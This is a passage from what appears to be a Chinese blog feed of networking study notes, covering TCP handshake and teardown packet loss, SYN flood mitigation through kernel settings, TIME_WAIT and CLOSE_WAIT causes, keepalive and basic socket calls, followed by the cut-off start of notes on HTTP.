秒后。没错，<strong>每次超时的时间是上一次的 2 倍</strong>。</p><p>当第五次超时重传后，会继续等待 32 秒，如果服务端仍然没有回应 ACK，客户端就不再发送 SYN 包，然后断开 TCP 连接。</p><p>所以，总耗时是 1+2+4+8+16+32&#x3D;63 秒，大约 1 分钟左右。</p><h4 id="第二次握手丢失了，会发生什么？"><a href="#第二次握手丢失了，会发生什么？" class="headerlink" title="第二次握手丢失了，会发生什么？"></a>第二次握手丢失了，会发生什么？</h4><p>当服务端收到客户端的第一次握手后，就会回 SYN-ACK 报文给客户端，这个就是第二次握手，此时服务端会进入 <code>SYN_RCVD</code> 状态。</p><p>第二次握手的 <code>SYN-ACK</code> 报文其实有两个目的 ：</p><ul><li>第二次握手里的 ACK， 是对第一次握手的确认报文；</li><li>第二次握手里的 SYN，是服务端发起建立 TCP 连接的报文；</li></ul><p>因为第二次握手报文里是包含对客户端的第一次握手的 ACK 确认报文，所以，如果客户端迟迟没有收到第二次握手，那么客户端就觉得可能自己的 SYN报文（第一次握手）丢失了，于是<strong>客户端就会触发超时重传机制，重传 SYN报文</strong>。</p><p>然后，因为第二次握手中包含服务端的 SYN 报文，所以当客户端收到后，需要给服务端发送 ACK 确认报文（第三次握手），服务端才会认为该 SYN 报文被客户端收到了。</p><p>那么，如果第二次握手丢失了，服务端就收不到第三次握手，于是<strong>服务端这边会触发超时重传机制，重传 SYN-ACK 报文</strong>。</p><p>因此，当第二次握手丢失了，客户端和服务端都会重传：</p><ul><li>客户端会重传 SYN 报文，也就是第一次握手，最大重传次数由 <code>tcp_syn_retries</code>内核参数决定；</li><li>服务端会重传 SYN-ACK 报文，也就是第二次握手，最大重传次数由 <code>tcp_synack_retries</code> 内核参数决定。</li></ul><h4 id="第三次握手丢失了，会发生什么？"><a href="#第三次握手丢失了，会发生什么？" class="headerlink" title="第三次握手丢失了，会发生什么？"></a>第三次握手丢失了，会发生什么？</h4><p>客户端收到服务端的 SYN-ACK 报文后，就会给服务端回一个 ACK 报文，也就是第三次握手，此时客户端状态进入到 <code>ESTABLISH</code> 状态。</p><p>因为这个第三次握手的 ACK 是对第二次握手的 SYN 的确认报文，所以当第三次握手丢失了，如果服务端那一方迟迟收不到这个确认报文，就会触发超时重传机制，重传 SYN-ACK 报文，直到收到第三次握手，或者达到最大重传次数。</p><p>注意，<strong>ACK 报文是不会有重传的，当 ACK 丢失了，就由对方重传对应的报文</strong>。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/network/tcp/%E7%AC%AC%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%A2%E5%A4%B1.drawio.png" alt="img"></p><h4 id="什么是SYN攻击？如何避免SYN攻击？"><a href="#什么是SYN攻击？如何避免SYN攻击？" class="headerlink" title="什么是SYN攻击？如何避免SYN攻击？"></a>什么是SYN攻击？如何避免SYN攻击？</h4><p>都知道 TCP 连接建立是需要三次握手，假设攻击者短时间伪造不同 IP 地址的 <code>SYN</code> 报文，服务端每接收到一个 <code>SYN</code> 报文，就进入<code>SYN_RCVD</code> 状态，但服务端发送出去的 <code>ACK + SYN</code> 报文，无法得到未知 IP 主机的 <code>ACK</code> 应答，久而久之就会<strong>占满服务端的半连接队列</strong>，使得服务端不能为正常用户服务。</p><p>什么是 TCP 半连接和全连接队列：</p><p>在 TCP 三次握手的时候，Linux 内核会维护两个队列，分别是：</p><ul><li>半连接队列，也称 SYN 队列；</li><li>全连接队列，也称 accept 队列；</li></ul><p>SYN 攻击方式最直接的表现就会把 TCP 半连接队列打满，这样<strong>当 TCP 半连接队列满了，后续再在收到 SYN 报文就会丢弃</strong>，导致客户端无法和服务端建立连接。</p><p>避免 SYN 攻击方式，可以有以下四种方法：</p><ul><li>调大 netdev_max_backlog；</li><li>增大 TCP 半连接队列；</li><li>开启 tcp_syncookies；</li><li>减少 SYN+ACK 重传次数</li></ul><blockquote><p>方式一：调大 netdev_max_backlog</p></blockquote><p>当网卡接收数据包的速度大于内核处理的速度时，会有一个队列保存这些数据包。控制该队列的最大值如下参数，默认值是 1000，我们要适当调大该参数的值，比如设置为 10000：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net.core.netdev_max_backlog = 10000</span><br></pre></td></tr></table></figure><blockquote><p>方式二：增大 TCP 半连接队列</p></blockquote><p>增大 TCP 半连接队列，要同时增大下面这三个参数：</p><ul><li>增大 net.ipv4.tcp_max_syn_backlog</li><li>增大 listen() 函数中的 backlog</li><li>增大 net.core.somaxconn</li></ul><blockquote><p>方式三：开启 net.ipv4.tcp_syncookies</p></blockquote><p>开启 syncookies 功能就可以在不使用 SYN 半连接队列的情况下成功建立连接，相当于绕过了 SYN 半连接来建立连接。</p><blockquote><p>方式四：减少 SYN+ACK 重传次数</p></blockquote><p>当服务端受到 SYN 攻击时，就会有大量处于 SYN_REVC 状态的 TCP 连接，处于这个状态的 TCP 会重传 SYN+ACK ，当重传超过次数达到上限后，就会断开连接。</p><p>针对 SYN 攻击的场景，可以减少 SYN-ACK 的重传次数，以加快处于SYN_REVC 状态的 TCP 连接断开。</p><p>SYN-ACK 报文的最大重传次数由 <code>tcp_synack_retries</code>内核参数决定（默认值是 5 次），比如将 tcp_synack_retries 减少到 2 次：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> 2 &gt; /proc/sys/net/ipv4/tcp_synack_retries</span></span><br></pre></td></tr></table></figure><h2 id="2024-11-19"><a href="#2024-11-19" class="headerlink" title="2024.11.19"></a>2024.11.19</h2><h3 id="TCP连接断开"><a href="#TCP连接断开" class="headerlink" title="TCP连接断开"></a>TCP连接断开</h3><h4 id="TCP-四次挥手过程是怎样的？"><a href="#TCP-四次挥手过程是怎样的？" class="headerlink" title="TCP 四次挥手过程是怎样的？"></a>TCP 四次挥手过程是怎样的？</h4><p>TCP断开连接是通过<strong>四次挥手</strong>方式。</p><p>双方都可以主动断开连接，断开连接后主机中的「资源」将被释放，四次挥手的过程如下图：</p><p><img src="https://cdn.xiaolincoding.com//mysql/other/format,png-20230309230614791.png" alt="客户端主动关闭连接 —— TCP 四次挥手"></p><ul><li>客户端打算关闭连接，此时会发送一个 TCP 首部 <code>FIN</code> 标志位被置为 <code>1</code> 的报文，也即 <code>FIN</code> 报文，之后客户端进入 <code>FIN_WAIT_1</code> 状态。</li><li>服务端收到该报文后，就向客户端发送 <code>ACK</code> 应答报文，接着服务端进入<code>CLOSE_WAIT</code> 状态。</li><li>客户端收到服务端的 <code>ACK</code> 应答报文后，之后进入 <code>FIN_WAIT_2</code> 状态。</li><li>等待服务端处理完数据后，也向客户端发送 <code>FIN</code> 报文，之后服务端进入<code>LAST_ACK</code> 状态。</li><li>客户端收到服务端的 <code>FIN</code> 报文后，回一个 <code>ACK</code> 应答报文，之后进入<code>TIME_WAIT</code> 状态</li><li>服务端收到了 <code>ACK</code> 应答报文后，就进入了 <code>CLOSE</code> 状态，至此服务端已经完成连接的关闭。</li><li>客户端在经过 <code>2MSL</code> 一段时间后，自动进入 <code>CLOSE</code> 状态，至此客户端也完成连接的关闭。</li></ul><p>可以看到，每个方向都需要<strong>一个 FIN 和一个 ACK</strong>，因此通常被称为<strong>四次挥手</strong>。</p><p>需要注意是：<strong>主动关闭连接的，才有 TIME_WAIT 状态。</strong></p><h4 id="为什么挥手需要四次？"><a href="#为什么挥手需要四次？" class="headerlink" title="为什么挥手需要四次？"></a>为什么挥手需要四次？</h4><p>回顾下四次挥手双方发 <code>FIN</code> 包的过程，就能理解为什么需要四次了。</p><ul><li>关闭连接时，客户端向服务端发送 <code>FIN</code> 时，仅仅表示客户端不再发送数据了但是还能接收数据。</li><li>服务端收到客户端的 <code>FIN</code> 报文时，先回一个 <code>ACK</code> 应答报文，而服务端可能还有数据需要处理和发送，等服务端不再发送数据时，才发送 <code>FIN</code> 报文给客户端来表示同意现在关闭连接。</li></ul><p>从上面过程可知，服务端通常需要等待完成数据的发送和处理，所以服务端的 <code>ACK</code> 和 <code>FIN</code> 一般都会分开发送，因此是需要四次挥手。</p><h4 id="第一次挥手丢失了，会发生什么？"><a href="#第一次挥手丢失了，会发生什么？" class="headerlink" title="第一次挥手丢失了，会发生什么？"></a>第一次挥手丢失了，会发生什么？</h4><p>当客户端（主动关闭方）调用 close 函数后，就会向服务端发送 FIN 报文，试图与服务端断开连接，此时客户端的连接进入到 <code>FIN_WAIT_1</code> 状态。</p><p>正常情况下，如果能及时收到服务端（被动关闭方）的 ACK，则会很快变为<code>FIN_WAIT2</code>状态。</p><p>如果第一次挥手丢失了，那么客户端迟迟收不到被动方的 ACK 的话，也就会触发超时重传机制，重传 FIN 报文，重发次数由 <code>tcp_orphan_retries</code> 参数控制。</p><p>当客户端重传 FIN 报文的次数超过 <code>tcp_orphan_retries</code> 后，就不再发送 FIN 报文，则会在等待一段时间（时间为上一次超时时间的 2 倍），如果还是没能收到第二次挥手，那么直接进入到 <code>close</code> 状态。</p><h4 id="第二次挥手丢失了，会发生什么？"><a href="#第二次挥手丢失了，会发生什么？" class="headerlink" title="第二次挥手丢失了，会发生什么？"></a>第二次挥手丢失了，会发生什么？</h4><p>当服务端收到客户端的第一次挥手后，就会先回一个 ACK 确认报文，此时服务端的连接进入到 <code>CLOSE_WAIT</code> 状态。</p><p>ACK 报文是不会重传的，所以如果服务端的第二次挥手丢失了，客户端就会触发超时重传机制，重传 FIN 报文，直到收到服务端的第二次挥手，或者达到最大的重传次数。</p><p>当客户端收到第二次挥手，也就是收到服务端发送的 ACK 报文后，客户端就会处于 <code>FIN_WAIT2</code> 状态，在这个状态需要等服务端发送第三次挥手，也就是服务端的 FIN 报文。</p><p>对于 close 函数关闭的连接，由于无法再发送和接收数据，所以<code>FIN_WAIT2</code> 状态不可以持续太久，而 <code>tcp_fin_timeout</code> 控制了这个状态下连接的持续时长，默认值是 60 秒。</p><p>这意味着对于调用 close 关闭的连接，如果在 60 秒后还没有收到 FIN 报文，客户端（主动关闭方）的连接就会直接关闭，如下图：</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/network/tcp/fin_wait_2.drawio.png" alt="img"></p><p>但是注意，如果主动关闭方使用 shutdown 函数关闭连接，指定了只关闭发送方向，而接收方向并没有关闭，那么意味着主动关闭方还是可以接收数据的。</p><p>此时，如果主动关闭方一直没收到第三次挥手，那么主动关闭方的连接将会此时，如果主动关闭方一直没收到第三次挥手，那么主动关闭方的连接将会接）。如下图：</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/network/tcp/fin_wait_2%E6%AD%BB%E7%AD%89.drawio.png" alt="img"></p><h4 id="第三次挥手丢失了，会发生什么？"><a href="#第三次挥手丢失了，会发生什么？" class="headerlink" title="第三次挥手丢失了，会发生什么？"></a>第三次挥手丢失了，会发生什么？</h4><p>当服务端（被动关闭方）收到客户端（主动关闭方）的 FIN 报文后，内核会自动回复 ACK，同时连接处于 <code>CLOSE_WAIT</code> 状态，顾名思义，它表示等待应用进程调用 close 函数关闭连接。</p><p>此时，内核是没有权利替代进程关闭连接，必须由进程主动调用 close 函数来触发服务端发送 FIN 报文。</p><p>服务端处于 CLOSE_WAIT 状态时，调用了 close 函数，内核就会发出 FIN 报文，同时连接进入 LAST_ACK 状态，等待客户端返回 ACK 来确认连接关闭。</p><p>如果迟迟收不到这个 ACK，服务端就会重发 FIN 报文，重发次数仍然由 <code>tcp_orphan_retrie</code>s 参数控制，这与客户端重发 FIN 报文的重传次数控制方式是一样的。</p><h4 id="第四次挥手丢失了，会发生什么？"><a href="#第四次挥手丢失了，会发生什么？" class="headerlink" title="第四次挥手丢失了，会发生什么？"></a>第四次挥手丢失了，会发生什么？</h4><p>当客户端收到服务端的第三次挥手的 FIN 报文后，就会回 ACK 报文，也就是第四次挥手，此时客户端连接进入 <code>TIME_WAIT</code> 状态。</p><p>在 Linux 系统，TIME_WAIT 状态会持续 2MSL 后才会进入关闭状态。</p><p>然后，服务端（被动关闭方）没有收到 ACK 报文前，还是处于 LAST_ACK 状态。</p><p>如果第四次挥手的 ACK 报文没有到达服务端，服务端就会重发 FIN 报文，重发次数仍然由前面介绍过的 <code>tcp_orphan_retries</code> 参数控制。</p><h4 id="为什么-TIME-WAIT-等待的时间是-2MSL？"><a href="#为什么-TIME-WAIT-等待的时间是-2MSL？" class="headerlink" title="为什么 TIME_WAIT 等待的时间是 2MSL？"></a>为什么 TIME_WAIT 等待的时间是 2MSL？</h4><p><code>MSL</code> 是 Maximum Segment Lifetime，<strong>报文最大生存时间</strong>，它是任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃。因为 TCP 报文基于是 IP 协议的，而 IP 头中有一个 <code>TTL</code> 字段，是 IP 数据报可以经过的最大路由数，每经过一个处理他的路由器此值就减 1，当此值为 0 则数据报将被丢弃，同时发送 ICMP 报文通知源主机。</p><p>MSL 与 TTL 的区别： MSL 的单位是时间，而 TTL 是经过路由跳数。所以<strong>MSL 应该要大于等于 TTL 消耗为 0 的时间</strong>，以确保报文已被自然消亡。</p><p><strong>TTL 的值一般是 64，Linux 将 MSL 设置为 30 秒，意味着 Linux 认为数据报文经过 64 个路由器的时间不会超过 30 秒，如果超过了，就认为报文已经消失在网络中了</strong>。</p><p>TIME_WAIT 等待 2 倍的 MSL，比较合理的解释是： 网络中可能存在来自发送方的数据包，当这些发送方的数据包被接收方处理后又会向对方发送响应，所以<strong>一来一回需要等待 2 倍的时间</strong>。</p><p><code>2MSL</code> 的时间是从<strong>客户端接收到 FIN 后发送 ACK 开始计时的</strong>。如果在TIME-WAIT 时间内，因为客户端的 ACK 没有传输到服务端，客户端又接收到了服务端重发的 FIN 报文，那么 <strong>2MSL 时间将重新计时</strong>。</p><p>在 Linux 系统里 <code>2MSL</code> 默认是 <code>60</code> 秒，那么一个 <code>MSL</code> 也就是 <code>30</code> 秒。<strong>Linux 系统停留在 TIME_WAIT 的时间为固定的 60 秒</strong>。</p><h4 id="为什么需要-TIME-WAIT-状态？"><a href="#为什么需要-TIME-WAIT-状态？" class="headerlink" title="为什么需要 TIME_WAIT 状态？"></a>为什么需要 TIME_WAIT 状态？</h4><p>主动发起关闭连接的一方，才会有 <code>TIME-WAIT</code> 状态。</p><p>需要 TIME-WAIT 状态，主要是两个原因：</p><ul><li>防止历史连接中的数据，被后面相同四元组的连接错误的接收；</li><li>保证「被动关闭连接」的一方，能被正确的关闭；</li></ul><p><em><strong>原因一：防止历史连接中的数据，被后面相同四元组的连接错误的接收</strong></em></p><ul><li><strong>序列号</strong>，是 TCP 一个头部字段，标识了 TCP 发送端到 TCP 接收端的数据流的一个字节，因为 TCP 是面向字节流的可靠协议，为了保证消息的顺序性和可靠性，TCP 为每个传输方向上的每个字节都赋予了一个编号，以便于传输成功后确认、丢失后重传以及在接收端保证不会乱序。<strong>序列号是一个 32 位的无符号数，因此在到达 4G 之后再循环回到 0</strong>。</li><li><strong>初始序列号</strong>，在 TCP 建立连接的时候，客户端和服务端都会各自生成一个初始序列号，它是基于时钟生成的一个随机数，来保证每个连接都拥有不同的初始序列号。<strong>初始化序列号可被视为一个 32 位的计数器，该计数器的数值每 4 微秒加 1，循环一次需要 4.55 小时</strong>。</li></ul><p>抓了一个包，下图中的 Seq 就是序列号，其中红色框住的分别是客户端和服务端各自生成的初始序列号。</p><p><img src="https://cdn.xiaolincoding.com//mysql/other/c9ea9b844e87bcd4acd3e320403ecab3.png" alt="TCP 抓包图"></p><p><strong>序列号和初始化序列号并不是无限递增的，会发生回绕为初始值的情况，这意味着无法根据序列号来判断新老数据</strong>。</p><p>假设 TIME-WAIT 没有等待时间或时间过短，被延迟的数据包抵达后会发生什么呢？</p><p><img src="https://cdn.xiaolincoding.com//mysql/other/6385cc99500b01ba2ef288c27523c1e7-20230309230608128.png" alt="TIME-WAIT 时间过短，收到旧连接的数据报文"></p><ul><li>服务端在关闭连接之前发送的 <code>SEQ = 301</code> 报文，被网络延迟了。</li><li>接着，服务端以相同的四元组重新打开了新连接，前面被延迟的 <code>SEQ = 301</code> 这时抵达了客户端，而且该数据报文的序列号刚好在客户端接收窗口内，因此客户端会正常接收这个数据报文，但是这个数据报文是上一个连接残留下来的，这样就产生数据错乱等严重的问题。</li></ul><p>为了防止历史连接中的数据，被后面相同四元组的连接错误的接收，因此 TCP 设计了 TIME_WAIT 状态，状态会持续 <code>2MSL</code> 时长，这个时间<strong>足以让两个方向上的数据包都被丢弃，使得原来连接的数据包在网络中都自然消失，再出现的数据包一定都是新建立连接所产生的。</strong></p><p><em><strong>原因二：保证「被动关闭连接」的一方，能被正确的关闭</strong></em></p><p>TIME-WAIT 作用是<strong>等待足够的时间以确保最后的 ACK 能让被动关闭方接收，从而帮助其正常关闭。</strong></p><p>如果客户端（主动关闭方）最后一次 ACK 报文（第四次挥手）在网络中丢失了，那么按照 TCP 可靠性原则，服务端（被动关闭方）会重发 FIN 报文。</p><p>假设客户端没有 TIME_WAIT 状态，而是在发完最后一次回 ACK 报文就直接进入 CLOSE 状态，如果该 ACK 报文丢失了，服务端则重传的 FIN 报文，而这时客户端已经进入到关闭状态了，在收到服务端重传的 FIN 报文后，就会回 RST 报文。</p><p><img src="https://cdn.xiaolincoding.com//mysql/other/3a81c23ce57c27cf63fc2b77e34de0ab-20230309230604522.png" alt="TIME-WAIT 时间过短，没有确保连接正常关闭"></p><p>服务端收到这个 RST 并将其解释为一个错误（Connection reset by peer），这对于一个可靠的协议来说不是一个优雅的终止方式。</p><p>为了防止这种情况出现，客户端必须等待足够长的时间，确保服务端能够收到 ACK，如果服务端没有收到 ACK，那么就会触发 TCP 重传机制，服务端会重新发送一个 FIN，这样一去一来刚好两个 MSL 的时间。</p><p>客户端在收到服务端重传的 FIN 报文时，TIME_WAIT 状态的等待时间，会重置回 2MSL。</p><h4 id="TIME-WAIT过多有什么危害？"><a href="#TIME-WAIT过多有什么危害？" class="headerlink" title="TIME_WAIT过多有什么危害？"></a>TIME_WAIT过多有什么危害？</h4><p>过多的 TIME-WAIT 状态主要的危害有两种：</p><ul><li>第一是占用系统资源，比如文件描述符、内存资源、CPU 资源、线程资源等；</li><li>第二是占用端口资源，端口资源也是有限的，一般可以开启的端口为<code>32768～61000</code>，也可以通过 <code>net.ipv4.ip_local_port_range</code>参数指定范围。</li></ul><p><strong>如果客户端（主动发起关闭连接方）的 TIME_WAIT 状态过多</strong>，就会受端口资源限制，如果占满了所有端口资源，那么就无法再跟「目的 IP+ 目的PORT」都一样的服务端建立连接了。</p><p><strong>如果服务端（主动发起关闭连接方）的 TIME_WAIT 状态过多</strong>，并不会导致端口资源受限，因为服务端只监听一个端口，而且由于一个四元组唯一确定一个 TCP 连接，因此理论上服务端可以建立很多连接，但是 TCP 连接过多，会占用系统资源，比如文件描述符、内存资源、CPU 资源、线程资源等。</p><h4 id="如何优化TIME-WAIT"><a href="#如何优化TIME-WAIT" class="headerlink" title="如何优化TIME_WAIT?"></a>如何优化TIME_WAIT?</h4><ul><li>打开 net.ipv4.tcp_tw_reuse 和 net.ipv4.tcp_timestamps 选项。</li><li>net.ipv4.tcp_max_tw_buckets</li><li>程序中使用 SO_LINGER ，应用强制使用 RST 关闭。</li></ul><p><strong>如果服务端要避免过多的 TIME_WAIT 状态的连接，就永远不要主动断开连接，让客户端去断开，由分布在各处的客户端去承受 TIME_WAIT</strong>。</p><h4 id="服务器出现大量-TIME-WAIT-状态的原因有哪些？"><a href="#服务器出现大量-TIME-WAIT-状态的原因有哪些？" class="headerlink" title="服务器出现大量 TIME_WAIT 状态的原因有哪些？"></a>服务器出现大量 TIME_WAIT 状态的原因有哪些？</h4><p> TIME_WAIT 状态是主动关闭连接方才会出现的状态，所以如果服务器出现大量的 TIME_WAIT 状态的 TCP 连接，就是说明服务器主动断开了很多 TCP 连接。</p><p><strong>什么场景下服务端会主动断开连接呢？</strong></p><ul><li>第一个场景：HTTP 没有使用长连接</li><li>第二个场景：HTTP 长连接超时</li><li>第三个场景：HTTP 长连接的请求数量达到上限</li></ul><h4 id="服务器出现大量-CLOSE-WAIT-状态的原因有哪些？"><a href="#服务器出现大量-CLOSE-WAIT-状态的原因有哪些？" class="headerlink" title="服务器出现大量 CLOSE_WAIT 状态的原因有哪些？"></a>服务器出现大量 CLOSE_WAIT 状态的原因有哪些？</h4><p>CLOSE_WAIT 状态是「被动关闭方」才会有的状态，而且如果「被动关闭方」没有调用 close 函数关闭连接，那么就无法发出 FIN 报文，从而无法使得 CLOSE_WAIT 状态的连接转变为 LAST_ACK 状态。</p><p>所以，<strong>当服务端出现大量 CLOSE_WAIT 状态的连接的时候，说明服务端的程序没有调用 close 函数关闭连接</strong>。</p><p><strong>当服务端出现大量 CLOSE_WAIT 状态的连接的时候，通常都是代码的问题，这时候我们需要针对具体的代码一步一步的进行排查和定位，主要分析的方向就是服务端为什么没有调用 close</strong>。</p><h4 id="如果已经建立了连接，但是客户端突然出现故障了怎么办？"><a href="#如果已经建立了连接，但是客户端突然出现故障了怎么办？" class="headerlink" title="如果已经建立了连接，但是客户端突然出现故障了怎么办？"></a>如果已经建立了连接，但是客户端突然出现故障了怎么办？</h4><p>客户端出现故障指的是客户端的主机发生了宕机，或者断电的场景。发生这种情况的时候，如果服务端一直不会发送数据给客户端，那么服务端是永远无法感知到客户端宕机这个事件的，也就是服务端的 TCP 连接将一直处于 <code>ESTABLISH</code> 状态，占用着系统资源。</p><p>为了避免这种情况，TCP 搞了个<strong>保活机制</strong>。这个机制的原理是这样的：</p><p>定义一个时间段，在这个时间段内，如果没有任何连接相关的活动，TCP 保活机制会开始作用，每隔一个时间间隔，发送一个探测报文，该探测报文包含的数据非常少，如果连续几个探测报文都没有得到响应，则认为当前的 TCP 连接已经死亡，系统内核将错误信息通知给上层应用程序。</p><p>如果开启了 TCP 保活，需要考虑以下几种情况：</p><ul><li>第一种，对端程序是正常工作的。当 TCP 保活的探测报文发送给对端, 对端会正常响应，这样 <strong>TCP 保活时间会被重置</strong>，等待下一个 TCP 保活时间的到来。</li><li>第二种，对端主机宕机并重启。当 TCP 保活的探测报文发送给对端后，对端是可以响应的，但由于没有该连接的有效信息，<strong>会产生一个 RST 报文</strong>，这样很快就会发现 TCP 连接已经被重置。</li><li>第三种，是对端主机宕机（<em>注意不是进程崩溃，进程崩溃后操作系统在回收进程资源的时候，会发送 FIN 报文，而主机宕机则是无法感知的，所以需要 TCP 保活机制来探测对方是不是发生了主机宕机</em>），或对端由于其他原因导致报文不可达。当 TCP 保活的探测报文发送给对端后，石沉大海，没有响应，连续几次，达到保活探测次数后，<strong>TCP 会报告该 TCP 连接已经死亡</strong>。</li></ul><h4 id="如果已经建立了连接，但是服务端的进程崩溃会发生什么？"><a href="#如果已经建立了连接，但是服务端的进程崩溃会发生什么？" class="headerlink" title="如果已经建立了连接，但是服务端的进程崩溃会发生什么？"></a>如果已经建立了连接，但是服务端的进程崩溃会发生什么？</h4><p>TCP 的连接信息是由内核维护的，所以当服务端的进程崩溃后，内核需要回收该进程的所有TCP 连接资源，于是内核会发送第一次挥手 FIN 报文，后续的挥手过程也都是在内核完成，并不需要进程的参与，所以即使服务端的进程退出了，还是能与客户端完成 TCP 四次挥手的过程。</p><h2 id="2024-11-25"><a href="#2024-11-25" class="headerlink" title="2024.11.25"></a>2024.11.25</h2><h3 id="Socket编程"><a href="#Socket编程" class="headerlink" title="Socket编程"></a>Socket编程</h3><h4 id="针对-TCP-应该如何-Socket-编程？"><a href="#针对-TCP-应该如何-Socket-编程？" class="headerlink" title="针对 TCP 应该如何 Socket 编程？"></a>针对 TCP 应该如何 Socket 编程？</h4><p><img src="https://cdn.xiaolincoding.com//mysql/other/format,png-20230309230545997.png" alt="基于 TCP 协议的客户端和服务端工作"></p><ul><li>服务端和客户端初始化 <code>socket</code>，得到文件描述符；</li><li>服务端调用 <code>bind</code>，将 socket 绑定在指定的 IP 地址和端口;</li><li>服务端调用 <code>listen</code>，进行监听；</li><li>服务端调用 <code>accept</code>，等待客户端连接；</li><li>客户端调用 <code>connect</code>，向服务端的地址和端口发起连接请求；</li><li>服务端 <code>accept</code> 返回用于传输的 <code>socket</code> 的文件描述符；</li><li>客户端调用 <code>write</code> 写入数据；服务端调用 <code>read</code> 读取数据；</li><li>客户端断开连接时，会调用 <code>close</code>，那么服务端 <code>read</code> 读取数据的时候，就会读取到了 <code>EOF</code>，待处理完数据后，服务端调用 <code>close</code>，表示连接关闭。</li></ul><p>这里需要注意的是，服务端调用 <code>accept</code> 时，连接成功了会返回一个已完成连接的 socket，后续用来传输数据。</p><p>所以，监听的 socket 和真正用来传送数据的 socket，是「两个」 socket，一个叫作<strong>监听 socket</strong>，一个叫作<strong>已完成连接 socket</strong>。</p><p>成功连接建立之后，双方开始通过 read 和 write 函数来读写数据，就像往一个文件流里面写东西一样。</p><h4 id="accept-发生在三次握手的哪一步？"><a href="#accept-发生在三次握手的哪一步？" class="headerlink" title="accept 发生在三次握手的哪一步？"></a>accept 发生在三次握手的哪一步？</h4><p>客户端 connect 成功返回是在第二次握手，服务端 accept成功返回是在三次握手成功之后。</p><h4 id="没有-accept，能建立-TCP-连接吗？"><a href="#没有-accept，能建立-TCP-连接吗？" class="headerlink" title="没有 accept，能建立 TCP 连接吗？"></a>没有 accept，能建立 TCP 连接吗？</h4><p><strong>可以的</strong>。accpet 系统调用并不参与 TCP 三次握手过程，它只是负责从 TCP 全连接队列取出一个已经建立连接的 socket，用户层通过 accpet 系统调用拿到了已经建立连接的 socket，就可以对该socket 进行读写操作了。</p><h4 id="没有-listen，能建立-TCP-连接吗？"><a href="#没有-listen，能建立-TCP-连接吗？" class="headerlink" title="没有 listen，能建立 TCP 连接吗？"></a>没有 listen，能建立 TCP 连接吗？</h4><p><strong>可以的</strong>。客户端是可以自己连自己的形成连接（<strong>TCP自连接</strong>），也可以两个客户端同时向对方发出请求建立连接（<strong>TCP同时打开</strong>），这两个情况都有个共同点，就是<strong>没有服务端参与，也就是没有 listen，就能 TCP 建立连接。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2024-11-3&quot;&gt;&lt;a href=&quot;#2024-11-3&quot; class=&quot;headerlink&quot; title=&quot;2024.11.3&quot;&gt;&lt;/a&gt;2024.11.3&lt;/h2&gt;&lt;h3 id=&quot;TCP基本认识&quot;&gt;&lt;a href=&quot;#TCP基本认识&quot; class=&quot;he</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://cychenhaibin.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://cychenhaibin.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>图解HTTP</title>
    <link href="http://cychenhaibin.github.io/2024/10/27/%E5%9B%BE%E8%A7%A3HTTP/"/>
    <id>http://cychenhaibin.github.io/2024/10/27/%E5%9B%BE%E8%A7%A3HTTP/</id>
    <published>2024-10-27T07:34:47.000Z</published>
    <updated>2024-10-27T07:42:09.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、了解Web及网络基础"><a href="#一、了解Web及网络基础" class="headerlink" title="一、了解Web及网络基础"></a>一、了解Web及网络基础</h2><h3 id="1、网络基础TCP-IP"><a href="#1、网络基础TCP-IP" class="headerlink" title="1、网络基础TCP&#x2F;IP"></a>1、网络基础TCP&#x2F;IP</h3><p>TCP&#x2F;IP协议族按层次分别为一下4层：<strong>应用层、传输层、网络层和数据链路层</strong></p><p><strong>应用层</strong>：HTTP</p><p><strong>传输层</strong>：TCP、UDP</p><p><strong>网络层</strong>：IP</p><p><strong>数据链路层</strong>：网络</p><h3 id="2、与HTTP关系密切的协议：IP、TCP和DNS"><a href="#2、与HTTP关系密切的协议：IP、TCP和DNS" class="headerlink" title="2、与HTTP关系密切的协议：IP、TCP和DNS"></a>2、与HTTP关系密切的协议：IP、TCP和DNS</h3><p>IP地址指明了节点被分配到的地址，MAC地址是指网卡所属的固定地址。IP地址可以和MAC地址进行配对。IP地址可变换，但MAC地址基本上不会改变。</p><p>当不在同一局域网时，在进行中转时会利用下一站中转设备的MAC地址来搜索下一中转目标，会采用ARP协议</p><p><strong>ARP</strong>：是一种用以解析地址的协议，根据通信方的IP地址就可以反查出对应的MAC地址。</p><p>用TCP协议把数据包送出去后，TCP不会对传达后的情况置之不理，它一定会向对方确认是否成功送达。握手过程中使用了TCP的标志——SYN和ACK。</p><p>发送端首先发送一个带有SYN标志的数据包给对方。接收端收到后，回传一个带有SYN&#x2F;ACK标志的数据包以示传达确认信息。最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。</p><h3 id="3、负责域名解析的DNS服务"><a href="#3、负责域名解析的DNS服务" class="headerlink" title="3、负责域名解析的DNS服务"></a>3、负责域名解析的DNS服务</h3><p>DNS服务是和HTTP协议一样位于应用层的协议。他提供域名到IP地址之间的解析服务。</p><p>用户通常使用主机名和域名来访问对方的计算机，而不是直接通过IP地址来访问。DNS协议提供通过域名查找IP地址，或逆向从IP地址反查域名的服务。</p><h3 id="4、各种协议与HTTP的关系"><a href="#4、各种协议与HTTP的关系" class="headerlink" title="4、各种协议与HTTP的关系"></a>4、各种协议与HTTP的关系</h3><p><img src="D:../image/%E5%9B%BE%E8%A7%A3HTTP/image-20241027154037526.png" alt="image-20241027154037526"></p><h2 id="二、简单的HTTP协议"><a href="#二、简单的HTTP协议" class="headerlink" title="二、简单的HTTP协议"></a>二、简单的HTTP协议</h2><p>请求报文是由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成。</p><p><img src="https://pica.zhimg.com/80/v2-98df69e7e8fccd46bfe03cc473784766_1440w.webp" 